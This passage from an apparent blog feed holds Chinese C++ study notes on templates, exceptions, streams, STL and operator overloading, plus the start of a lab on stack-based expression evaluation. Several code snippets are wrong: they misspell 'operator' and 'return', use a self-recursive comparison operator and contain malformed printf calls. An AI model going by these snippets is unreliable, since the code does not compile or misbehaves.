</span>&#123;</span><br><span class="line">	T temp = x;</span><br><span class="line">    x = y;</span><br><span class="line">    y = temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//函数模板</span></span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220901115032424.png" alt="image-20220901115032424"></p>
<h2 id="如果要做模板-不会进行类型转换"><a href="#如果要做模板-不会进行类型转换" class="headerlink" title="如果要做模板, 不会进行类型转换"></a>如果要做模板, 不会进行类型转换</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220901115416190.png" alt="image-20220901115416190"></p>
<h2 id="类模板的使用方法"><a href="#类模板的使用方法" class="headerlink" title="类模板的使用方法"></a>类模板的使用方法</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220901120014134.png" alt="image-20220901120014134"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220901120233477.png" alt="image-20220901120233477"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220901115943105.png" alt="image-20220901115943105"></p>
<h1 id="第三十章-模板II"><a href="#第三十章-模板II" class="headerlink" title="第三十章 模板II"></a>第三十章 模板II</h1><h2 id="函数模板类"><a href="#函数模板类" class="headerlink" title="函数模板类"></a>函数模板类</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220906235854432.png" alt="image-20220906235854432"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220906234217080.png" alt="image-20220906234217080"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vector&lt; vector&lt; <span class="keyword">double</span> * &gt; &gt; <span class="comment">// note spcae &gt; &gt;</span></span><br><span class="line">vector&lt; <span class="keyword">int</span> (*) (vector &lt;<span class="keyword">double</span>&gt;&amp;,<span class="keyword">int</span>)&gt;</span><br></pre></td></tr></table></figure>
<h1 id="第三十一章-异常基本概念"><a href="#第三十一章-异常基本概念" class="headerlink" title="第三十一章 异常基本概念"></a>第三十一章 异常基本概念</h1><h2 id="Exceptions-（异常）"><a href="#Exceptions-（异常）" class="headerlink" title="Exceptions （异常）"></a>Exceptions （异常）</h2><blockquote>
<p>c++ 你写的不好的代码不应该被运行</p>
</blockquote>
<p>c++ 比 c 语言更多检查</p>
<h2 id="EX-read-a-file"><a href="#EX-read-a-file" class="headerlink" title="EX. read a file"></a>EX. read a file</h2><p>open the file；1、文件不存在。 2、文件存在，但不可读取。 ……</p>
<p>determine its size；</p>
<p>allocate that much memory； 1、介质可能会坏掉</p>
<p>read the file into memory；</p>
<p>close the file；</p>
<p>以上每一句话可能都有问题</p>
<p>C 中每个操作都有对应的返回值告诉你操作是否成功。</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913184633624.png" alt="image-20220913184633624"></p>
<h2 id="Working-w-exception"><a href="#Working-w-exception" class="headerlink" title="Working /w exception"></a>Working /w exception</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try&#123;</span><br><span class="line">	open the file;</span><br><span class="line">	determine the file;</span><br><span class="line">	alloocate that much memory;</span><br><span class="line">	read the file into memory;</span><br><span class="line">&#125; catch (fileOpenFailed)&#123;</span><br><span class="line">	doSomething;</span><br><span class="line">&#125; catch (sizeDetermination)&#123;</span><br><span class="line">	doSomething;</span><br><span class="line">&#125; catch (memoryAllocation)&#123;</span><br><span class="line">	doSomething;</span><br><span class="line">&#125; catch(readFailed)&#123;</span><br><span class="line">	doSomething;</span><br><span class="line">&#125; catchZ(fileCloseFailed)&#123;</span><br><span class="line">	doSomething;</span><br><span class="line">&#125;</span><br><span class="line">异常处理的方式</span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913185322857.png" alt="image-20220913185322857"></p>
<ul>
<li>I take exception to that</li>
<li>At the point where the problem occurs, you might not what to do with it, but you do know that you can’t just continue on merrily; you must stop, and somebody, somewhere must figure out what to do.</li>
</ul>
<h2 id="Why-exception"><a href="#Why-exception" class="headerlink" title="Why exception?"></a>Why exception?</h2><p>exception把 业务逻辑和错误处理分开的很清楚。</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913185634255.png" alt="image-20220913185634255"></p>
<ul>
<li>异常处理最大的好处就是， 他们能够清理和处理错误代码</li>
<li>分开了描述你想要做的代码和你需要执行的代码</li>
</ul>
<h1 id="第三十二章-异常抛出和捕获"><a href="#第三十二章-异常抛出和捕获" class="headerlink" title="第三十二章 异常抛出和捕获"></a>第三十二章 异常抛出和捕获</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try&#123; </span><br><span class="line"> // 可能会导致错误的代码</span><br><span class="line">&#125; catch(error)&#123; </span><br><span class="line"> // 在错误发生时怎么处理</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h2 id="看一个例子"><a href="#看一个例子" class="headerlink" title="看一个例子"></a>看一个例子</h2><p>如果 operatior[] （index） 越界了怎么办？</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913190459719.png" alt="image-20220913190459719"></p>
<ol>
<li>什么返回值都不做</li>
</ol>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913190345021.png" alt="image-20220913190345021"></p>
<ol>
<li>返回错误的值 但是依然可以做成加减法，不合理.</li>
</ol>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913190352338.png" alt="image-20220913190352338"></p>
<ol>
<li><p>Just die！</p>
<p> <img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913190652289.png" alt="image-20220913190652289"></p>
</li>
<li><p>Die gracefully （with autoplay!） ASSERT…</p>
</li>
</ol>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913190658272.png" alt="image-20220913190658272"></p>
<h2 id="When-to-use-exception"><a href="#When-to-use-exception" class="headerlink" title="When to use exception"></a>When to use exception</h2><h2 id="How-to-raise-an-Exception"><a href="#How-to-raise-an-Exception" class="headerlink" title="How  to raise an Exception"></a>How  to raise an Exception</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913190903938.png" alt="image-20220913190903938"></p>
<p><code>throw &lt;&lt; something &gt;&gt;</code></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913192837860.png" alt="image-20220913192837860"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913193758031.png" alt="image-20220913193758031"></p>
<p>….(详见视频 看不懂)</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913194448781.png" alt="image-20220913194448781"></p>
<p>异常处理1. 处理完之后回去继续执行下一条语句， 2. 处理完之后重新处理</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913194801717.png" alt="image-20220913194801717"></p>
<p>catch (…) 所有的异常类型。。。</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913194859031.png" alt="image-20220913194859031"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220913195526829.png" alt="image-20220913195526829"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">throw expression;</span><br><span class="line">- throws value for matching 抛出一串表达式</span><br><span class="line">throw; </span><br><span class="line">- 接受刚刚真正处理的表达式</span><br><span class="line">- 只能在这个catch 里面使用</span><br></pre></td></tr></table></figure>
<h1 id="第三十三章-异常语句"><a href="#第三十三章-异常语句" class="headerlink" title="第三十三章 异常语句"></a>第三十三章 异常语句</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">.... <span class="comment">// maybe Error</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in"><span class="keyword">catch</span></span> (SomeType v) &#123;</span><br><span class="line">...<span class="comment">// handler code</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in"><span class="keyword">catch</span></span> (SomeType v) &#123;</span><br><span class="line">...<span class="comment">// handler code</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="using-inheritance-使用继承"><a href="#using-inheritance-使用继承" class="headerlink" title="using inheritance( 使用继承 )"></a>using inheritance( 使用继承 )</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">abc</span><span class="params">(<span class="keyword">int</span> a)</span> : throw(MathErr)&#123;</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ab</span><span class="params">(<span class="keyword">int</span> a)</span> : throw()&#123;</span></span><br><span class="line">    ... <span class="comment">//不抛任何异常</span></span><br><span class="line">&#125;</span><br><span class="line">abc 只能抛出abc的异常。限制abc自己处理异常</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220915133840390.png" alt="image-20220915133840390"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220915134012787.png" alt="image-20220915134012787"></p>
<h2 id="Failure-in-constructors"><a href="#Failure-in-constructors" class="headerlink" title="Failure in constructors:"></a>Failure in constructors:</h2><ul>
<li>No return value is possible</li>
<li>Use an “uninitialized flag”</li>
<li>Defer work to an Init() function</li>
</ul>
<p><em>Better</em>: Throw an exception</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220915134232488.png" alt="image-20220915134232488"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220915134726625.png" alt="image-20220915134726625"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220915135236538.png" alt="image-20220915135236538"></p>
<p>更多学习： <a href="https://www.runoob.com/cplusplus/cpp-exceptions-handling.html">https://www.runoob.com/cplusplus/cpp-exceptions-handling.html</a></p>
<h1 id="第三十四章-流的概念"><a href="#第三十四章-流的概念" class="headerlink" title="第三十四章 流的概念"></a>第三十四章 流的概念</h1><h2 id="Streams-流"><a href="#Streams-流" class="headerlink" title="Streams 流"></a>Streams 流</h2><h3 id="Originial-C-I-O-used-printf-scanf"><a href="#Originial-C-I-O-used-printf-scanf" class="headerlink" title="Originial C I/O used printf, scanf"></a>Originial C I/O used printf, scanf</h3><p>文件是有 文本和二进制的方式</p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220921020707492.png" alt="image-20220921020707492"></p>
<p>C的 printf 和scanf 是不安全的</p>
<p>ifstream （i fstream） </p>
<p>ofstream  (o fstream)</p>
<h2 id="C-vs-C"><a href="#C-vs-C" class="headerlink" title="C vs. C++"></a>C vs. C++</h2><p>C stdio operations work</p>
<ul>
<li>don’t provide “object-oriented” features</li>
<li>No overloaded operators</li>
</ul>
<p>C++ </p>
<ul>
<li>Can overload inserters ( &gt;&gt; )and extractors ( &lt;&lt; )  </li>
</ul>
<p>Moral</p>
<ul>
<li>When converting C to C++, leave the  I/O intact</li>
</ul>
<h2 id="What-is-a-steam"><a href="#What-is-a-steam" class="headerlink" title="What is a steam?"></a>What is a steam?</h2><ul>
<li><p>Common logical interfface to a device (所有的东西都以一维度单方向的方式去访问)</p>
</li>
<li><p>流不能在任意地方读和写</p>
</li>
</ul>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220921021451311.png" alt="image-20220921021451311"></p>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220921021606743.png" alt="image-20220921021606743"></p>
<p>( &gt;&gt; 和 &lt;&lt; ) 跟 reciever 有关 </p>
<p>Manipulators</p>
<h2 id="Kinds-of-streams"><a href="#Kinds-of-streams" class="headerlink" title="Kinds of streams"></a>Kinds of streams</h2><ul>
<li>Text streams （文本流） 特殊的二进制文件 PARSE-&gt; 解析</li>
<li>Binary streams （二进制流）二进制文件（不以人的阅读为目的的文件）</li>
</ul>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220921022415552.png" alt="image-20220921022415552"></p>
<h1 id="第三十五章-流的运算符"><a href="#第三十五章-流的运算符" class="headerlink" title="第三十五章 流的运算符"></a>第三十五章 流的运算符</h1><h1 id="第三十六章-STL简述"><a href="#第三十六章-STL简述" class="headerlink" title="第三十六章 STL简述"></a>第三十六章 STL简述</h1><h2 id="Data-struct-amp-algorithms"><a href="#Data-struct-amp-algorithms" class="headerlink" title="Data struct &amp; algorithms"></a>Data struct &amp; algorithms</h2><blockquote>
<ul>
<li><p>What is STL</p>
</li>
<li><p>part of thr ISO Standard C++ library</p>
</li>
<li><p>Data Structures and algorithms for  C++.</p>
</li>
</ul>
</blockquote>
<h2 id="Why-should-I-use-STL"><a href="#Why-should-I-use-STL" class="headerlink" title="Why should I use STL"></a>Why should I use STL</h2><p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220908000742688.png" alt="image-20220908000742688"></p>
<ul>
<li>减少开发时间</li>
<li>代码可读性</li>
<li>强壮性(处理好越界的问题)</li>
<li>可维护的代码</li>
<li>相对比较简单</li>
</ul>
<p><img src="/2023/01/05/Study/%E7%BF%81%E5%87%AF%E7%9A%84C++%E5%AD%A6%E4%B9%A0/image-20220908001205697.png" alt="image-20220908001205697"></p>
<h2 id="STL特点"><a href="#STL特点" class="headerlink" title="STL特点"></a>STL特点</h2><ul>
<li>Containers</li>
<li>Algorihms</li>
<li>Iterators (枚举器)</li>
</ul>
<h1 id="map-vector-list-链表"><a href="#map-vector-list-链表" class="headerlink" title="map. vector. list(链表)"></a>map. vector. list(链表)</h1><h1 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++)&#123;</span><br><span class="line">        x.<span class="built_in">push_back</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">	vector&lt;<span class="keyword">int</span>&gt;::<span class="function">iterator p</span></span><br><span class="line"><span class="function">    <span class="title">for</span><span class="params">(p=x.begin(); p&lt;x.end(); p++)</span></span>&#123;</span><br><span class="line">        cout &lt;&lt; *p &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="重载运算符全部原型"><a href="#重载运算符全部原型" class="headerlink" title="重载运算符全部原型"></a>重载运算符全部原型</h1><h2 id="前缀-：-a"><a href="#前缀-：-a" class="headerlink" title="前缀++ ： ++a"></a>前缀++ ： ++a</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">number&amp; operation ++ ()&#123; <span class="comment">//++ 在前可以做左值</span></span><br><span class="line">    ++<span class="keyword">this</span>-&gt;a; 	</span><br><span class="line">    reutrn *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="后缀-：-a"><a href="#后缀-：-a" class="headerlink" title="后缀++： a++"></a>后缀++： a++</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> number operation ++ (<span class="keyword">int</span>)&#123; <span class="comment">// ++在后不可以做左值</span></span><br><span class="line">    <span class="function">number <span class="title">temp</span><span class="params">(*<span class="keyword">this</span>)</span></span>; </span><br><span class="line">    <span class="keyword">this</span>-&gt;a++；</span><br><span class="line">    reutrn temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="赋值运算符："><a href="#赋值运算符：" class="headerlink" title="赋值运算符：="></a>赋值运算符：=</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">number&amp; operation = (<span class="keyword">const</span> number &amp;num)&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">this</span>-&gt;a != num.a)</span><br><span class="line">	    <span class="keyword">this</span>-&gt;a = num.a</span><br><span class="line">     <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="重载大小等于号"><a href="#重载大小等于号" class="headerlink" title="重载大小等于号"></a>重载大小等于号</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span> operation &lt; (number&amp; number)&#123;</span><br><span class="line">    <span class="keyword">if</span>(*<span class="keyword">this</span>.a &lt; number.a) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">bool</span> operation == (number&amp; number)[</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;a == number.a) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">]</span><br><span class="line"><span class="keyword">bool</span> operation &gt; (number&amp; number)&#123;</span><br><span class="line">    <span class="keyword">if</span>(*<span class="keyword">this</span> &gt; number) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">bool</span> operation  &gt;=()</span><br></pre></td></tr></table></figure>
<h2 id="重载方括号"><a href="#重载方括号" class="headerlink" title="重载方括号"></a>重载方括号</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> &amp;operation [](<span class="keyword">int</span> index)&#123;</span><br><span class="line">    <span class="keyword">return</span> array[index];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重载 &gt;&gt; 和 &lt;&lt;</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="comment">//#include &lt;iostream&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pixel</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Pixel</span>() &#123; red = green = blue = <span class="number">0</span>;&#125;</span><br><span class="line">	<span class="built_in">Pixel</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span> a, <span class="keyword">unsigned</span> <span class="keyword">int</span> b, <span class="keyword">unsigned</span> <span class="keyword">int</span> c)&#123;</span><br><span class="line">		red = a;</span><br><span class="line">		green = b;</span><br><span class="line">		blue = c;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">Pixel</span>(<span class="keyword">const</span> Pixel&amp; p)&#123;</span><br><span class="line">		red = p.red;</span><br><span class="line">		blue = p.blue;</span><br><span class="line">		green = p.green;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">friend</span> istream&amp; <span class="keyword">operator</span> &gt;&gt;(istream&amp; c, Pixel &amp;p);</span><br><span class="line">	<span class="keyword">friend</span> ostream&amp; <span class="keyword">operator</span> &lt;&lt;(ostream&amp; c, Pixel &amp;p);</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> red, green, blue;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">istream&amp; <span class="keyword">operator</span> &gt;&gt;(istream&amp; c, Pixel &amp;p)&#123;</span><br><span class="line">	c &gt;&gt; p.red &gt;&gt; p.green &gt;&gt; p.blue;</span><br><span class="line">	<span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">ostream&amp; <span class="keyword">operator</span> &lt;&lt;(ostream&amp; c, Pixel &amp;p)&#123;</span><br><span class="line">	c &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; p.red &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; p.green &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; p.blue &lt;&lt; <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	<span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Study</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>c++</tag>
        <tag>oop</tag>
      </tags>
  </entry>
  <entry>
    <title>表达式的值和计算</title>
    <url>/2022/06/16/Study/%E5%AE%9E%E9%AA%8C%E8%AF%BE%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%80%BC%E5%92%8C%E8%AE%A1%E7%AE%97/</url>
    <content><![CDATA[<h1 id="第一节课内容"><a href="#第一节课内容" class="headerlink" title="第一节课内容:"></a>第一节课内容:</h1><p>​    预备学习课题任务: 学习使用C++ STL-栈应用<br>​    基本任务: 算数表达式求值(应用map容器)<br>​    扩展任务1:较复杂的表达式求值和交互式求值(难,模板化实现)<br>​    扩展任务2: 求真值表达式的应用<br>​    扩展任务3: 二元树和表达式</p>
<h2 id="基本任务"><a href="#基本任务" class="headerlink" title="基本任务:"></a>基本任务:</h2><h3 id="STL-栈应用的实现"><a href="#STL-栈应用的实现" class="headerlink" title="STL-栈应用的实现:"></a>STL-栈应用的实现:</h3><ol>
<li>创建一个stack类模板: 名字为stk;</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	stack&lt;<span class="keyword">int</span> &gt; stk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><h4 id="push-用来把元素入栈"><a href="#push-用来把元素入栈" class="headerlink" title="push() 用来把元素入栈"></a>push() 用来把元素入栈</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) &#123;</span><br><span class="line">		<span class="keyword">int</span> n;</span><br><span class="line">		cin&gt;&gt;n;</span><br><span class="line">		stk.<span class="built_in">push</span>(n); <span class="comment">//stk.push(n) 把n加入到栈中</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>endl,stk.<span class="built_in">top</span>());</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol>
<li><h4 id="top-用来访问栈顶元素"><a href="#top-用来访问栈顶元素" class="headerlink" title="top() 用来访问栈顶元素"></a>top() 用来访问栈顶元素</h4></li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) &#123;</span><br><span class="line">		<span class="keyword">int</span> n;</span><br><span class="line">		cin&gt;&gt;n;</span><br><span class="line">		stk.<span class="built_in">push</span>(n);</span><br><span class="line">        <span class="comment">//0 1 2 3</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>endl,stk.<span class="built_in">top</span>());</span><br><span class="line">    <span class="comment">// 输出3 //stk.top()的值 也就是栈顶的值3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>pop() 弹出栈顶元素</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) &#123;</span><br><span class="line">		stk.<span class="built_in">push</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 0 1 2 3</span></span><br><span class="line">	stk.<span class="built_in">pop</span>();<span class="comment">//移除栈顶元素 (无返回值)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>endl,stk.<span class="built_in">top</span>());</span><br><span class="line">    <span class="comment">//输出2 //弹出栈顶后还有一个值就是2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>empty() 判断栈空?</p>
